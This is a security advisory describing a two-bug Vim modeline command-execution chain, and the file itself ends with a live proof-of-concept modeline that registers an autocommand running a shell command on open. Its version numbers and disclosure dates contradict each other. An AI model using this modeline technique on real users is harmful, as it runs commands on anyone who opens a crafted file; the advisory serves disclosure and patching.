# Vim tabpanel modeline RCE affects Vim < 9.2.0272

## Summary

A two-bug chain in Vim allows arbitrary command execution when a user opens a crafted file. The `tabpanel` option can be set from a modeline without requiring `modelineexpr`, and its expression is later evaluated in the sandbox. That sandbox can be escaped because `autocmd_add()` does not check whether it is running in a secure context, allowing deferred execution outside the sandbox.

---

## Technical Details

The issue depends on two flaws:

1. **`tabpanel` is missing `P_MLE`**  
   Unlike `statusline` and `tabline`, `tabpanel` is not marked with the `P_MLE` flag. This allows a modeline to inject `%{...}` expressions even when `modelineexpr` is disabled.

2. **`autocmd_add()` lacks `check_secure()`**  
   Vim evaluates insecure `tabpanel` expressions in the sandbox, but `autocmd_add()` can still register autocommands there. Those autocommands execute later, after the sandbox exits.

A modeline can therefore:
- force the tab panel visible with `showtabpanel=2`
- inject a `tabpanel` expression
- call `autocmd_add()` inside the sandbox
- register a `SafeStateAgain` autocommand
- execute an arbitrary shell command once Vim returns to normal context

This yields code execution as the user running Vim.

---

## Steps to Reproduce

This advisory itself is a PoC:

```shell
vim -version
VIM - Vi IMproved 9.2 (2026 Feb 14, compiled Mar 25 2026 22:04:13)

wget https://raw.githubusercontent.com/califio/publications/refs/heads/main/MADBugs/vim-vs-emacs-vs-claude/vim.md
vim vim.md
cat /tmp/calif-vim-rce-poc
```

# Recommendations

Upgrade to VIM v9.2.0172.

## Credits

Hung Nguyen (movrment) from Calif.io

# Disclosure Timeline

- **2026-03-28:** Vulnerabilities discovered using Claude
- **2026-03-29:** Reported to vim-security@googlegroups.com
- **2026-03-30:** Fix released https://github.com/vim/vim/security/advisories/GHSA-2gmj-rpqf-pxvh
- **2026-03-03:** Public disclosure made

/* vim: set showtabpanel=2 tabpanel=%{%autocmd_add([{'event'\:'SafeStateAgain','pattern'\:'*','cmd'\:'!id>/tmp/calif-vim-rce-poc','once'\:1}])%}: */
